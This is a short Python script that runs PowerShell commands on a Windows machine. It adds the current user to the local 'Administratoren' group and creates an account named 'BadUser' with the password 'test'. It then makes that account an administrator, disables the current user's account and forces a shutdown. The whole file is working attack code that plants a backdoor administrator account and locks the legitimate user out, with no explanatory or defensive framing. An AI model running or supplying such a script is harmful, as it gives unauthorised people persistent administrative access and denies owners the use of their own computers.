import getpass
import subprocess, sys

currentUser = getpass.getuser() # Get Current Username
newUser = "BadUser"
passwordNewUser = "test"

# Make User Admin
p = subprocess.Popen(["powershell.exe", f"Add-LocalGroupMember -Group \"Administratoren\" -Member {currentUser}"], stdout=sys.stdout)
p.communicate()

# New User
p = subprocess.Popen(["powershell.exe", f"New-LocalUser -Name {newUser} -Description \"Description of this account\" -NoPassword"], stdout=sys.stdout)
p.communicate()

# Password for New User
p = subprocess.Popen(["powershell.exe", f"net user {newUser} test"], stdout=sys.stdout)
p.communicate()


# Add-LocalGroupMember -Group "Administratoren" -Member User02
# Make NewUser Admin
p = subprocess.Popen(["powershell.exe", f"Add-LocalGroupMember -Group \"Administratoren\" -Member {newUser}"], stdout=sys.stdout)
p.communicate()

# lock Current Account
p = subprocess.Popen(["powershell.exe", f"Disable-LocalUser -Name {currentUser}"], stdout=sys.stdout)
p.communicate()

# Force Shutdown computer 
p = subprocess.Popen(["powershell.exe", f"Stop-Computer -ComputerName localhost"], stdout=sys.stdout)
p.communicate()